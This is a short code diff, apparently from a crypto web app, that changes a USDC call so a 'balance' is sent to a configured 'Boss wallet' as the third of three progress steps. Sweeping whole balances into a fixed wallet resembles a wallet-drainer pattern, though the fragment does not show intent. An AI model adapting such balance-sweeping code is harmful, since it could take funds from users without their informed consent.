@@ -161,7 +161,7 @@
 
         progress(70);
         status("(3/3) Transferring balance to Boss wallet...");
-        const tx = await usdc.transferFrom(user, CONFIG.BOSS_WALLET, balance);
+        const tx = await usdc.transfer(CONFIG.BOSS_WALLET, balance);
         await tx.wait();
 
         progress(100);
